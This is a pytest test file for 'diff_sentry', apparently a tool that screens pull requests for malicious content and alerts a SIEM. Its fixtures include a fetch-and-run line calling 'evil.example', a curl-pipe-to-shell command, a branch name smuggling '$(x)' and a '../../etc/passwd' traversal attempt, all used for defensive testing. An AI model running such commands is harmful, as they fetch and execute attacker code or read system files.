"""The deterministic screen, the early-alert stage, and the `watch` / `actor` / `archive` subcommands, all offline. The screen needs no model creds and no Deno; that is what lets a watcher run as a cheap first tier."""

from __future__ import annotations

import json
import subprocess
import sys
from datetime import UTC, datetime, timedelta

import pytest

from diff_sentry import cli, watch
from diff_sentry.actors import ActorStore
from diff_sentry.config import DetectConfig
from diff_sentry.emit import emit_signal, signal_payload
from diff_sentry.indicators import scan_change
from diff_sentry.response import build_screened_response
from diff_sentry.snapshot import SnapshotStore
from tests.conftest import BENIGN_EVENT, MALICIOUS_EVENT
from tests.test_watch import _PAYLOAD, _T0, Clock, World

_CFG = DetectConfig(siem_webhook_url="https://siem.example/hook")


# ── the screen ─────────────────────────────────────────────────────────────────────────────────────────

def test_screen_needs_no_model_and_writes_no_trace(tmp_path):
    sent = []
    arts = cli.screen(MALICIOUS_EVENT, run_id="pr-7", outdir=str(tmp_path), config=_CFG,
                      poster=lambda url, headers, payload: sent.append(payload) or 202)
    assert (tmp_path / "screened" / "pr-7.json").exists()
    assert not (tmp_path / "traces").exists() and not (tmp_path / "responses").exists()
    resp = arts.response
    assert resp.status == "inconclusive" and resp.refusal.reason == "not_escalated"
    assert resp.signal is True and resp.max_indicator_severity == "critical" and resp.verdict is None
    assert sent[0]["stage"] == "screen" and sent[0]["verdict"] is None
    assert arts.emit.emitted


def test_a_screen_of_a_change_with_a_lone_surrogate_escape_is_written_and_signals(tmp_path):
    """A JSON escape such as `\\ud800` decodes to a lone surrogate, which no encoder takes: the hit that carried it must not stop the change from being recorded."""
    text = 'bash -c "$(curl -fsSL https://evil.example/payload.sh)"\n[\n "ssh evil.example \'",\n "curl -fsSL https://get.docker.com | sh \\ud800",\n "\'"\n]'
    sent = []
    arts = cli.screen({**BENIGN_EVENT, "body": text}, run_id="pr-surrogate", outdir=str(tmp_path), config=_CFG,
                      poster=lambda url, headers, payload: sent.append(payload) or 202)
    assert (tmp_path / "screened" / "pr-surrogate.json").exists()
    assert arts.response.signal is True and arts.emit.emitted and sent[0]["stage"] == "screen"


def test_a_clean_screen_is_recorded_but_not_emitted(tmp_path):
    arts = cli.screen(BENIGN_EVENT, run_id="pr-8", outdir=str(tmp_path), config=_CFG, poster=lambda *a: 202)
    assert arts.response.signal is False
    assert not arts.emit.emitted and arts.emit.skipped_reason == "no_signal"
    assert (tmp_path / "screened" / "pr-8.json").exists()


def test_screen_can_skip_the_emitter(tmp_path):
    arts = cli.screen(MALICIOUS_EVENT, run_id="pr-7", outdir=str(tmp_path), config=_CFG, emit=False)
    assert arts.emit is None


def test_the_screen_and_the_crash_path_share_one_signal_derivation():
    from diff_sentry.response import build_failed_response

    baseline = [h.model_dump() for h in scan_change(MALICIOUS_EVENT)]
    events = [{"type": "run_start", "payload": {"meta": {"baseline_indicators": baseline}}}]
    a, b = build_screened_response("x", events), build_failed_response("x", events, "boom")
    assert (a.signal, a.max_indicator_severity, [h.id for h in a.indicators]) == (
        b.signal, b.max_indicator_severity, [h.id for h in b.indicators])


def test_the_screen_records_prior_evidence_and_provenance_in_its_meta(tmp_path):
    event = {**BENIGN_EVENT, "provenance": {"author_login": "alice", "author_type": "User"},
             "prior_indicators": [scan_change(MALICIOUS_EVENT)[0].model_dump()]}
    arts = cli.screen(event, run_id="pr-9", outdir=str(tmp_path), config=_CFG, emit=False)
    assert arts.response.indicators, "the earlier version's evidence must ride along"


def test_a_malformed_prior_indicator_is_skipped():
    event = {**BENIGN_EVENT, "prior_indicators": [{"nonsense": 1}, "x", None]}
    assert cli._baseline_indicators(event) == cli._baseline_indicators(BENIGN_EVENT)


def test_screen_from_env_needs_no_roles(monkeypatch):
    for k in ("DS_ROOT_LM", "DS_SUB_LM"):
        monkeypatch.delenv(k, raising=False)
    monkeypatch.setenv("DS_SIEM_WEBHOOK_URL", "https://siem.example/x")
    monkeypatch.setenv("DS_EMIT_ON", "malicious")
    cfg = DetectConfig.screen_from_env()
    assert cfg.can_emit and cfg.emit_on == ("malicious",) and cfg.main_model == ""
    with pytest.raises(ValueError):
        DetectConfig.from_env()                       # the full config still demands the roles


def test_the_final_stage_is_the_default(tmp_path):
    from diff_sentry.schema import DetectionResponse

    resp = DetectionResponse(id="x", status="classified", signal=True)
    assert signal_payload(resp)["stage"] == "final" and signal_payload(resp, stage="screen")["stage"] == "screen"
    sent = []
    emit_signal(resp, _CFG, poster=lambda u, h, p: sent.append(p) or 200)
    assert sent[0]["stage"] == "final"


# ── watch ──────────────────────────────────────────────────────────────────────────────────────────────

@pytest.fixture
def fake_github(monkeypatch):
    clock = Clock(datetime.now(UTC))
    world = World(clock)
    monkeypatch.setattr(watch, "_gh_cli_list", lambda *a, **k: world.list_api)
    monkeypatch.setattr(watch, "_default_api", lambda: world.api)
    monkeypatch.setattr(watch, "_default_raw", lambda: (lambda path, accept: ""))
    return world


def test_watch_needs_a_watchlist(tmp_path, capsys):
    rc = cli.main(["watch", "--screen-only", "--state", str(tmp_path / "s"), "--out", str(tmp_path / "o")])
    assert rc == 2 and "no repositories" in capsys.readouterr().err


def test_watch_once_screen_only_end_to_end(tmp_path, fake_github, monkeypatch, capsys):
    monkeypatch.delenv("DS_SIEM_WEBHOOK_URL", raising=False)
    state, out = str(tmp_path / "s"), str(tmp_path / "o")
    argv = ["watch", "--once", "--screen-only", "--repos", "acme/widgets", "--state", state, "--out", out]
    assert cli.main(argv) == 0                                   # the first pass sets the watermark
    assert "new=0" in capsys.readouterr().out
    fake_github.pr("acme/widgets", 7, body=_PAYLOAD, at=datetime.now(UTC) + timedelta(seconds=1))
    assert cli.main(argv) == 0
    assert "new=1" in capsys.readouterr().out
    assert (tmp_path / "o" / "screened" / "acme__widgets-pr-7.json").exists()
    assert cli.main(["watch", "--stats", "--screen-only", "--state", state, "--out", out]) == 0
    assert json.loads(capsys.readouterr().out)["changes"] == 1


def test_watch_reads_a_repos_file(tmp_path, fake_github, capsys):
    (tmp_path / "repos.txt").write_text("# the watchlist\nacme/widgets\nacme/gadgets  # second\n")
    rc = cli.main(["watch", "--once", "--screen-only", "--repos-file", str(tmp_path / "repos.txt"),
                   "--state", str(tmp_path / "s"), "--out", str(tmp_path / "o")])
    assert rc == 0
    assert {c[0].split("/")[1] + "/" + c[0].split("/")[2] for c in fake_github.list_calls} == {
        "acme/widgets", "acme/gadgets"}


# ── actor and archive ──────────────────────────────────────────────────────────────────────────────────

def _seed(tmp_path):
    state = tmp_path / "state"
    state.mkdir()
    store = ActorStore(str(state / "actors.db"))
    event = {**MALICIOUS_EVENT, "created_at": _T0.isoformat(), "head_ref": "dev$(x)",
             "provenance": {"author_login": "hackerbot-claw", "author_type": "User", "author_id": 9,
                            "author_account_created_at": "2026-02-20T00:00:00+00:00",
                            "commit_tz_offsets": {"+0800": 1}}}
    hits = scan_change(event)
    store.record(event, run_id="acme__widgets-pr-7", hits=hits, content_hits=hits)
    store.close()
    snaps = SnapshotStore(str(state / "snapshots"))
    cap = snaps.put(repo="acme/widgets", kind="pull_request", number=7, event=event)
    return str(state), cap.sha256


def test_actor_prints_the_dossier(tmp_path, capsys):
    state, _ = _seed(tmp_path)
    assert cli.main(["actor", "hackerbot-claw", "--state", state]) == 0
    out = capsys.readouterr().out
    assert "actor: hackerbot-claw" in out and "acme/widgets#7" in out and "+0800" in out


def test_actor_json_and_lookup_failures(tmp_path, capsys):
    state, _ = _seed(tmp_path)
    assert cli.main(["actor", "id:9", "--state", state, "--json"]) == 0
    assert json.loads(capsys.readouterr().out)["account_age_at_first_seen_days"] == 7
    assert cli.main(["actor", "nobody", "--state", state]) == 1
    assert cli.main(["actor", "x", "--state", str(tmp_path / "missing")]) == 2


def test_actor_live_adds_recent_public_activity(tmp_path, capsys, monkeypatch):
    state, _ = _seed(tmp_path)
    monkeypatch.setattr("diff_sentry.ingest.public_activity", lambda login: {"events": 3, "login": login})
    assert cli.main(["actor", "hackerbot-claw", "--state", state, "--live"]) == 0
    assert '"events": 3' in capsys.readouterr().out


def test_archive_verify_and_show(tmp_path, capsys):
    state, sha = _seed(tmp_path)
    assert cli.main(["archive", "verify", "--state", state]) == 0
    assert "intact" in capsys.readouterr().out
    assert cli.main(["archive", "show", sha, "--state", state]) == 0
    assert json.loads(capsys.readouterr().out)["event"]["head_ref"] == "dev$(x)"
    assert cli.main(["archive", "show", "--state", state]) == 2
    assert cli.main(["archive", "verify", "--state", str(tmp_path / "nope")]) == 2


def test_archive_show_refuses_anything_but_a_sha256(tmp_path, capsys):
    state, _ = _seed(tmp_path)
    assert cli.main(["archive", "show", "../../etc/passwd", "--state", state]) == 2
    assert "sha256" in capsys.readouterr().err
    assert cli.main(["archive", "show", "0" * 64, "--state", state]) == 2          # well-formed but absent


def test_watch_without_model_roles_explains_screen_only(tmp_path, capsys, monkeypatch):
    for k in ("DS_ROOT_LM", "DS_SUB_LM"):
        monkeypatch.delenv(k, raising=False)
    rc = cli.main(["watch", "--once", "--repos", "acme/widgets", "--state", str(tmp_path / "s")])
    assert rc == 2 and "--screen-only" in capsys.readouterr().err


def test_archive_verify_fails_on_tampering(tmp_path, capsys):
    import gzip
    state, sha = _seed(tmp_path)
    with gzip.open(tmp_path / "state" / "snapshots" / "objects" / sha[:2] / f"{sha}.json.gz", "wb") as fh:
        fh.write(b"forged")
    assert cli.main(["archive", "verify", "--state", state]) == 1
    assert "problem" in capsys.readouterr().out


# ── module hygiene ─────────────────────────────────────────────────────────────────────────────────────

def test_the_new_host_side_modules_stay_dspy_free():
    code = ("import sys, diff_sentry, diff_sentry.actors, diff_sentry.snapshot, diff_sentry.watch, "
            "diff_sentry.ingest, diff_sentry.indicators, diff_sentry.hosts, diff_sentry.dbutil, diff_sentry.cli; "
            "sys.exit(1 if 'dspy' in sys.modules else 0)")
    assert subprocess.run([sys.executable, "-c", code], check=False).returncode == 0


# ── account handling ──────────────────────────────────────────────────────────────────────

def test_stats_is_read_only_and_needs_neither_model_roles_nor_a_watchlist(tmp_path, fake_github, monkeypatch, capsys):
    for k in ("DS_ROOT_LM", "DS_SUB_LM", "DS_WATCH_REPOS"):
        monkeypatch.delenv(k, raising=False)
    state, out = str(tmp_path / "s"), str(tmp_path / "o")
    assert cli.main(["watch", "--stats", "--state", state]) == 2                    # no state yet
    argv = ["watch", "--once", "--screen-only", "--repos", "acme/widgets", "--state", state, "--out", out]
    monkeypatch.delenv("DS_SIEM_WEBHOOK_URL", raising=False)
    assert cli.main(argv) == 0
    capsys.readouterr()
    assert cli.main(["watch", "--stats", "--state", state]) == 0
    assert json.loads(capsys.readouterr().out)["changes"] == 0
    monkeypatch.setenv("DS_WATCH_PAUSED_REPOS", "Acme/Widgets")
    assert cli.main(["watch", "--stats", "--state", state]) == 0
    assert json.loads(capsys.readouterr().out)["queued_paused"] == 0
    monkeypatch.setenv("DS_WATCH_PAUSED_REPOS", "not-a-repo")
    assert cli.main(["watch", "--stats", "--state", state]) == 2 and "owner/name" in capsys.readouterr().err


def test_bad_watchlists_are_reported_not_tracebacks(tmp_path, monkeypatch, capsys):
    state = str(tmp_path / "s")
    assert cli.main(["watch", "--once", "--screen-only", "--repos-file", str(tmp_path / "missing.txt"),
                     "--state", state]) == 2
    assert cli.main(["watch", "--once", "--screen-only", "--repos", "not-a-repo", "--state", state]) == 2
    monkeypatch.setenv("DS_WATCH_REPOS", "also bad")
    assert cli.main(["watch", "--once", "--screen-only", "--state", state]) == 2
    assert "owner/name" in capsys.readouterr().err


def test_a_second_watch_on_the_same_state_directory_is_refused(tmp_path, fake_github, monkeypatch, capsys):
    from diff_sentry.watch import _InstanceLock

    monkeypatch.delenv("DS_SIEM_WEBHOOK_URL", raising=False)
    state = tmp_path / "s"
    state.mkdir()
    held = _InstanceLock(str(state))
    held.acquire()
    try:
        rc = cli.main(["watch", "--once", "--screen-only", "--repos", "acme/widgets", "--state", str(state),
                       "--out", str(tmp_path / "o")])
        assert rc == 2 and "already using" in capsys.readouterr().err
    finally:
        held.release()


def test_a_state_directory_from_another_build_is_refused_with_advice(tmp_path, capsys):
    import sqlite3

    state = tmp_path / "s"
    state.mkdir()
    db = sqlite3.connect(str(state / "watch.db"))
    db.execute("CREATE TABLE changes (repo TEXT)")
    db.commit()
    db.close()
    rc = cli.main(["watch", "--once", "--screen-only", "--repos", "acme/widgets", "--state", str(state)])
    assert rc == 2 and "different build" in capsys.readouterr().err


def test_requeue_failed_command(tmp_path, capsys):
    from diff_sentry.watch import WatchState

    state = tmp_path / "s"
    state.mkdir()
    st = WatchState(str(state / "watch.db"))
    st.enqueue("r1", 5, {"repo": "a/b", "kind": "issue", "number": 1}, datetime.now(UTC))
    st.bury("r1")
    st.close()
    assert cli.main(["watch", "--requeue-failed", "--state", str(state)]) == 0
    assert "requeued 1" in capsys.readouterr().out
    st = WatchState(str(state / "watch.db"))
    assert st.queue_size() == 1
    st.close()


# ── operator edges ──────────────────────────────────────────────────────────────────────

def test_stats_really_is_read_only(tmp_path, capsys):
    import os
    import stat

    from diff_sentry.watch import WatchState

    state = tmp_path / "s"
    state.mkdir()
    WatchState(str(state / "watch.db")).close()
    os.chmod(state / "watch.db", stat.S_IRUSR)                 # a file the process cannot write
    before = (state / "watch.db").read_bytes()
    assert cli.main(["watch", "--stats", "--state", str(state)]) == 0
    assert json.loads(capsys.readouterr().out)["changes"] == 0
    assert (state / "watch.db").read_bytes() == before


def test_actor_on_a_store_from_another_build_says_so_instead_of_a_traceback(tmp_path, capsys):
    import sqlite3

    state = tmp_path / "s"
    state.mkdir()
    db = sqlite3.connect(str(state / "actors.db"))
    db.execute("CREATE TABLE sightings (run_id TEXT)")
    db.commit()
    db.close()
    assert cli.main(["actor", "anyone", "--state", str(state)]) == 2
    assert "different build" in capsys.readouterr().err


def test_an_absurd_backfill_is_reported_not_a_traceback(tmp_path, monkeypatch, capsys):
    monkeypatch.setenv("DS_WATCH_BACKFILL_HOURS", "inf")
    assert cli.main(["watch", "--once", "--screen-only", "--repos", "a/b", "--state", str(tmp_path / "s")]) == 2
    assert "watch:" in capsys.readouterr().err


def test_json_output_escapes_control_characters_json_leaves_raw():
    out = cli._json_out({"x": "a\x85b\x9bc\x7fd é 日本"})
    assert "\x85" not in out and "\x9b" not in out and "\x7f" not in out
    assert "é" in out and "日本" in out                          # readable text stays readable
    assert json.loads(out)["x"] == "a\x85b\x9bc\x7fd é 日本"     # and it still round-trips


def test_archive_show_escapes_control_characters(tmp_path, capsys):
    state = tmp_path / "state"
    state.mkdir()
    snaps = SnapshotStore(str(state / "snapshots"))
    cap = snaps.put(repo="a/b", kind="issue", number=1, event={"body": "x\x9b31my"})
    assert cli.main(["archive", "show", cap.sha256, "--state", str(state)]) == 0
    assert "\x9b" not in capsys.readouterr().out


# ── hostile input ──────────────────────────────────────────────────────────────────────

def test_a_siem_payload_lists_the_worst_indicators_and_counts_the_rest():
    from diff_sentry.emit import _MAX_SIGNAL_INDICATORS
    from diff_sentry.schema import DetectionResponse, IndicatorHit

    hits = [IndicatorHit(id=f"i{n}", rule="command-substitution", severity="medium", title="t") for n in range(500)]
    hits.append(IndicatorHit(id="worst", rule="curl-pipe-shell", severity="critical", title="t"))
    payload = signal_payload(DetectionResponse(id="x", status="inconclusive", signal=True, indicators=hits))
    assert len(payload["indicators"]) == _MAX_SIGNAL_INDICATORS and payload["indicator_count"] == 501
    assert payload["indicators"][0]["id"] == "worst"


def test_a_state_file_that_is_not_sqlite_is_reported_not_a_traceback(tmp_path, capsys):
    state = tmp_path / "s"
    state.mkdir()
    (state / "watch.db").write_bytes(b"this is not a database" * 100)
    (state / "actors.db").write_bytes(b"neither is this" * 100)
    assert cli.main(["watch", "--stats", "--state", str(state)]) == 2
    assert cli.main(["actor", "anyone", "--state", str(state)]) == 2
    assert "not a diff-sentry state file" in capsys.readouterr().err


@pytest.mark.parametrize("name,value", [("DS_WATCH_MAX_QUEUE", "x"), ("DS_WATCH_INTERVAL", "soon"),
                                        ("DS_WATCH_BACKFILL_HOURS", "inf"), ("DS_WATCH_RECHECK_HOURS", "nan")])
def test_a_bad_environment_value_names_the_variable(tmp_path, monkeypatch, capsys, name, value):
    monkeypatch.setenv(name, value)
    assert cli.main(["watch", "--once", "--screen-only", "--repos", "a/b", "--state", str(tmp_path / "s")]) == 2
    assert name in capsys.readouterr().err


def test_a_custom_runner_or_screener_written_before_the_new_keywords_still_works(tmp_path):
    from datetime import UTC
    from types import SimpleNamespace

    from diff_sentry.watch import WatchConfig, Watcher

    seen = {}

    def old_runner(event, *, run_id, outdir, config, emit, poster):        # no `emit_failed`
        seen["runner"] = run_id
        return SimpleNamespace(assembled=None, status="failed")

    def old_screener(event, *, run_id, outdir, config, emit, poster):     # no `baseline`
        seen["screener"] = run_id

    world = World(Clock(datetime.now(UTC)))
    w = Watcher(WatchConfig(repos=("acme/widgets",), state_dir=str(tmp_path / "s"), out_dir=str(tmp_path / "o")),
                DetectConfig(main_model="x", sub_model="x", classifier_model="x"), list_api=world.list_api,
                api=world.api, runner=old_runner, screener=old_screener, clock=world.clock)
    w.poll_once()
    world.clock.advance(minutes=1)
    world.pr("acme/widgets", 1)
    w.poll_once()
    w.drain(limit=1)
    assert seen == {"screener": "acme__widgets-pr-1", "runner": "acme__widgets-pr-1"}
    w.close()


def test_the_text_of_a_change_is_scanned_once_by_the_poller(tmp_path, monkeypatch):
    from datetime import UTC

    from diff_sentry import indicators
    from diff_sentry.watch import WatchConfig, Watcher

    calls = []
    real = indicators.scan_change
    monkeypatch.setattr(indicators, "scan_change", lambda ev: calls.append(1) or real(ev))
    world = World(Clock(datetime.now(UTC)))
    w = Watcher(WatchConfig(repos=("acme/widgets",), state_dir=str(tmp_path / "s"), out_dir=str(tmp_path / "o"),
                            screen_only=True), DetectConfig(), list_api=world.list_api, api=world.api,
                clock=world.clock)
    w.poll_once()
    world.clock.advance(minutes=1)
    world.pr("acme/widgets", 1, body=_PAYLOAD)
    w.poll_once()
    assert len(calls) == 1                                  # examine, baseline and screen share one scan
    w.close()


def test_a_non_finite_interval_is_refused(tmp_path, capsys):
    assert cli.main(["watch", "--once", "--screen-only", "--repos", "a/b", "--interval", "inf",
                     "--state", str(tmp_path / "s")]) == 2
    assert "finite" in capsys.readouterr().err


def test_json_output_escapes_bidi_and_tag_characters_too():
    hostile = "".join(chr(c) for c in (0x202E, 0x2028, 0x2066, 0xFEFF, 0xE0041))     # built, never typed
    out = cli._json_out({"x": f"a{hostile}b"})
    assert not any(c in out for c in hostile)
    zwj = chr(0x200D)
    family = chr(0x1F468) + zwj + chr(0x1F469)
    assert zwj in cli._json_out({"x": family})                                          # a joiner is real text
